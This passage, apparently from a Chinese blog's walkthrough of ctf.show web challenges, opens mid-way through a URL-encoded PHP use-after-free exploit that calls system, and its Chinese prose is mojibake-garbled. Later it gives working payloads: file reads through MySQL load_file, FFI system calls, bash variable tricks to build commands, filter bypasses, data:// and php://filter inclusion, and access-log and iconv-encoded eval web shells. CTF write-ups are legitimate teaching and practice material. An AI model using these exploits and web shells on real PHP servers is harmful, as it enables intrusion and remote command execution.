3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E%0A</span><br></pre></td></tr></table></figure>

<p>å®åœ¨æ˜¯å¤ªé«˜ç«¯äº†ã€‚</p>
<h1 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h1><p>å’Œ71æ˜¯ä¸€æ ·çš„ï¼Œç›´æ¥æŸ¥çœ‹ç›®å½•ç„¶åincludeå°±è¡Œäº†ã€‚</p>
<h1 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h1><p>é™åˆ¶äº†ä¸èƒ½ä½¿ç”¨scandirï¼Œæ‰€ä»¥å°±åªèƒ½ä½¿ç”¨72é¢˜çš„æ–¹æ³•åŒºè¯»å–ç›®å½•ï¼Œç„¶åå†ä½¿ç”¨includeå»è¯»å–ã€‚</p>
<h1 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h1><p>é¦–å…ˆå°±æ˜¯æŸ¥æ–‡ä»¶ï¼Œè¿™ä¸ªåŠæ—¶è¿˜å’Œä¸Šè¾¹çš„ä¸€æ ·çš„æ–¹æ³•</p>
<p>æ•°æ®åº“åå­—éœ€è¦åˆ©ç”¨å‰é¢çš„web58å»æ‰¾</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pocï¼š</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">	<span class="comment"># åœ¨MySQLä¸­,load_file(å®Œæ•´è·¯å¾„)å‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</span></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>é€šè¿‡ php PDO è¿æ¥æ•°æ®åº“ï¼Œé€šè¿‡æ•°æ®åº“çš„å‡½æ•°é—´æ¥æŸ¥è¯¢æ–‡ä»¶å†…å®¹</strong>ï¼Œè¿™é¢˜å…¶å®ä¸ç”¨tryä¹Ÿè¡Œ</p>
<h1 id="Web76"><a href="#Web76" class="headerlink" title="Web76"></a>Web76</h1><p>å’Œä¸Šé¢˜ä¸€æ¨¡ä¸€æ ·çš„åšæ³•å³å¯</p>
<h1 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h1><p>è¿™é¢˜è¦ç”¨åˆ°ä»€ä¹ˆFFIï¼Œæ²¡å­¦è¿‡çš„ä¸œè¥¿ï¼Œåªèƒ½ç°å­¦äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œæ˜¯æŒ‡åœ¨ä¸€ç§è¯­è¨€é‡Œè°ƒç”¨å¦ä¸€ç§è¯­è¨€ä»£ç çš„æŠ€æœ¯ã€‚PHPçš„FFIæ‰©å±•å°±æ˜¯ä¸€ä¸ªè®©ä½ åœ¨PHPé‡Œè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥å°†å†…å®¹è¾“å‡ºåˆ°1.txt</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</span></span><br></pre></td></tr></table></figure>

<p>é‡‡ç”¨cè¯­è¨€å»è¯»å–å°±è¡Œï¼Œè€Œä¸”æ³¨æ„ç›´æ¥è¯»å–æ˜¯æ²¡ç”¨çš„ï¼Œæ‰§è¡Œreadflagå³å¯</p>
<h1 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h1><p>è¿™é¢˜éœ€è¦ä½¿ç”¨ç¯å¢ƒå˜é‡å»å†™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//åˆ©ç”¨ç³»ç»Ÿå˜é‡æ„é€ nlå‘½ä»¤</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</span><br><span class="line"></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;æ˜¯nl</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~M&#125;$&#123;PWD:~J&#125; ????.???</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¾—åˆ°äº†flag</p>
<p>è¿˜æœ‰åˆ«çš„åˆ©ç”¨${PATH}æ„é€ çš„payload</p>
<blockquote>
<p>SHLVLæ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶${SHLVL}&#x3D;1ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶${SHLVL}&#x3D;2ã€‚<br>${PWD:$æ˜¯0ï¼Œ${SHLVL}ä¸º1<br>$æ¥æ›¿ä»£æ•°å­—ï¼Œæˆªå–æƒ³è¦çš„å­—ç¬¦ä¸²</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#$&#123;RANDOM&#125;æ˜¯éšæœºæ•°ï¼Œ$&#123;#RANDOM&#125;ä¸€èˆ¬æ˜¯5ï¼Œä¹Ÿå¯èƒ½æ˜¯4</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">#å…¶ä»–å¸ˆå‚…</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>

<h1 id="Web119"><a href="#Web119" class="headerlink" title="Web119"></a>Web119</h1><p>è¿™æ¬¡ç¦ç”¨äº†<code>$&#123;PATH</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line"># pwd=/var/www/html</span><br><span class="line"># USER=www-data</span><br><span class="line"># payloadå³ä¸º /???/?at ????.???</span><br><span class="line">ä¸ºäº†æ„é€ /bin/cat </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¹Ÿå¯ä»¥åªè¦aè¿›è¡Œæ„é€ </span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure>

<h1 id="Web120"><a href="#Web120" class="headerlink" title="Web120"></a>Web120</h1><p>å’Œä¸Šé¢˜ä¸€æ ·çš„åšæ³•å³å¯</p>
<h1 id="Web121"><a href="#Web121" class="headerlink" title="Web121"></a>Web121</h1><p>æ˜¯åªèƒ½ä½¿ç”¨pwdäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;?&#125;=0ï¼Œ$&#123;#?&#125;=1($?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯)</span><br><span class="line"></span><br><span class="line">$&#123;#IFS&#125;=3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span><br><span class="line"></span><br><span class="line">/???/r?? ????.???</span><br><span class="line">/bin/rev</span><br></pre></td></tr></table></figure>

<h1 id="Web122"><a href="#Web122" class="headerlink" title="Web122"></a>Web122</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$?è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯</span><br><span class="line"></span><br><span class="line">ä¸ºä»€ä¹ˆæœ‰ &lt;A</span><br><span class="line"></span><br><span class="line">&lt;Aè¿”å›çš„é”™è¯¯å€¼ ä½¿å¾—$?ä¸º1</span><br><span class="line"></span><br><span class="line">ç„¶åå†ä½¿ç”¨randomå»éšæœºï¼Œå¤šç‚¹å‡ æ¬¡å°±æœ‰å¯ä»¥å¾—åˆ°æºç çš„</span><br></pre></td></tr></table></figure>

<h1 id="Web124"><a href="#Web124" class="headerlink" title="Web124"></a>Web124</h1><p>è®²ä¸‹ä¸»è¦å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert  		#åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚</span><br><span class="line">hexdec 			 #æŠŠåå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚</span><br><span class="line">dechex 			#æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚</span><br><span class="line">hex2bin  		#æŠŠåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIç </span><br></pre></td></tr></table></figure>

<p>æ„é€ $_GET æŠŠå‚æ•°é€ƒé€¸å‡ºå»</p>
<p>è½¬æˆ10è¿›åˆ¶ å¤šè½¬ä¸€å±‚ç»•è¿‡è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠ hex2binè½¬åŒ–ä¸º10è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;hex2bin&quot;</span>, <span class="number">36</span>, <span class="number">16</span>);   <span class="comment">//37907361743</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;8d3746fcf&quot;</span>, <span class="number">16</span>, <span class="number">36</span>);  <span class="comment">//hex2bin</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//æŠŠ_GET å…ˆè½¬ä¸º16è¿›åˆ¶å†è½¬ä¸º10è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;_GET&quot;</span>));  <span class="comment">//1598506324</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;8d3746fcf&quot;</span>, <span class="number">16</span>, <span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="string">&quot;1598506324&quot;</span>));  <span class="comment">// ç»•è¿‡è¿‡æ»¤æ‹¿åˆ° &quot;_GET&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜è§£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat%20flag.php</span><br><span class="line"></span><br><span class="line">$$pi&#123;abs&#125;($$pi&#123;acos&#125;)  #ç›¸å½“äº $_GET[&#x27;abs&#x27;]($_GET[&#x27;acos&#x27;])</span><br></pre></td></tr></table></figure>

<h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><p>ç›´æ¥ç”¨base64å»è¯»å–å°±å¯ä»¥äº†</p>
<h1 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h1><p>è¿™é¢˜å‘ç°phpè¢«æ›¿æ¢æ‰äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨dataåè®®å³å¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h1><p>è¿™é¢˜æŠŠdataåè®®ä¹Ÿç¦æ‰äº†</p>
<p>è¿™å°±å¾—ä½¿ç”¨æ–‡ä»¶æ—¥å¿—åŒ…å«å»è§£å†³äº†</p>
<p>dataè¢«æ›¿æ¢<br>æ—¥å¿—æ–‡ä»¶åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>User-Agentæ’å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨èšå‰‘å»è¿æ¥å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p>
<h1 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h1><p>è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ä¸Šé¢ä¸€é¢˜çš„æ–‡ä»¶æ—¥å¿—åŒ…å«å»å®Œæˆ</p>
<h1 id="Web82-Web86"><a href="#Web82-Web86" class="headerlink" title="Web82-Web86"></a>Web82-Web86</h1><p>sessionæ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å› ä¸ºéœ€è¦ç«äº‰çš„ç¯å¢ƒï¼Œå¾—åŠå¤œæ‰æœ‰ï¼Œæ‰€ä»¥å°±å…ˆæ”¾æ”¾ï¼Œç†è§£çŸ¥è¯†ç‚¹æ‰æ˜¯ä¸»è¦</p>
<h1 id="Web87"><a href="#Web87" class="headerlink" title="Web87"></a>Web87</h1><p>dieæ­»äº¡ç»•è¿‡ï¼Œæ¯”è¾ƒç®€å•çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=2.php</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¦æ³¨æ„çš„ç‚¹æ˜¯è¿™é‡Œéœ€è¦è¿›è¡Œä¸¤æ¬¡urlåŠ å¯†ï¼Œå¹¶ä¸”æ˜¯å…¨å­—æ¯åŠ å¯†</p>
<h1 id="Web88"><a href="#Web88" class="headerlink" title="Web88"></a>Web88</h1><p>å’Œ79é¢˜ä¸€æ ·ï¼Œç”¨dataåè®®å³å¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Web116"><a href="#Web116" class="headerlink" title="Web116"></a>Web116</h1><p>è¿™é¢˜éœ€è¦ç»“åˆmiscçš„çŸ¥è¯†ç‚¹å»åšï¼Œæˆ‘ä»¬å»å¯¹è§†é¢‘è¿›è¡Œåˆ†ææ‰¾åˆ°æºç ï¼Œç„¶åå°±å¾ˆå®¹æ˜“å¾—å†™å‡ºè¿™é¢˜</p>
<h1 id="Web117"><a href="#Web117" class="headerlink" title="Web117"></a>Web117</h1><p><strong>è§£ç­”</strong>ï¼šä¸¤ä¸ªå‚æ•°ï¼Œæœ‰è¿‡æ»¤ï¼Œæœ‰dieã€‚<br>stringå­—ç¬¦ä¸²è¿‡æ»¤å™¨è¢«è¿‡æ»¤äº†ï¼Œbase64ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä½†è¿˜æœ‰convert.iconv.</p>
<p>æŠŠ<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">ä¸€å¥è¯æœ¨é©¬</a>ä»<code>UCS-2LE</code>ç¼–ç è½¬æ¢ä¸º<code>UCS-2BE</code>ç¼–ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[jz]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;payload:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSj[]z;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;jiuzhen.php<br>postï¼šcontents&#x3D;?&lt;hp pe@av(l_$OPTSj[]z;)&gt;?</p>
<p>èšå‰‘è¿æ¥ï¼Œæˆ–è€…ç›´æ¥è®¿é—®jiuzhen.phpï¼Œpostä¼ å‚ã€‚</p>
<h1 id="Web89"><a href="#Web89" class="headerlink" title="Web89"></a>Web89</h1><p>ç›´æ¥æ•°ç»„ç»•è¿‡å³å¯</p>
<h1 id="Web90"><a href="#Web90" class="headerlink" title="Web90"></a>Web90</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://804aeafe-d39e-4a16-a21d-0daec7483e63.challenge.ctf.show/?num=4476a</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å¤šåŠ ä¸€ä¸ªå­—æ¯å³å¯</p>
<h1 id="Web91"><a href="#Web91" class="headerlink" title="Web91"></a>Web91</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">i </span><br><span class="line">ä¸åŒºåˆ†(ignore)å¤§å°å†™</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">å¤š(more)è¡ŒåŒ¹é…</span><br><span class="line">è‹¥å­˜åœ¨æ¢è¡Œ\nå¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œ</span><br><span class="line">å°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">è¿™æ ·å…¶å®æ˜¯ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå› ä¸ºåŒ¹é…çš„æ—¶å€™ å…ˆæ˜¯åŒ¹é…æ¢è¡Œç¬¦å‰é¢çš„ï¼Œæ¥ç€åŒ¹é…æ¢è¡Œç¬¦åé¢çš„ï¼Œä¸¤ä¸ªéƒ½æ˜¯abcæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ . ä¸­åŒ…å«æ¢è¡Œç¬¦</span><br><span class="line">é»˜è®¤çš„åœ†ç‚¹ . æ˜¯åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ï¼ŒåŠ ä¸Šsä¹‹å, .åŒ…å«æ¢è¡Œç¬¦</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">è¿™æ ·åŒ¹é…åˆ°çš„æœ‰ä¸‰ä¸ª bg b\n bs</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">å¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…;</span><br><span class="line"></span><br><span class="line">D</span><br><span 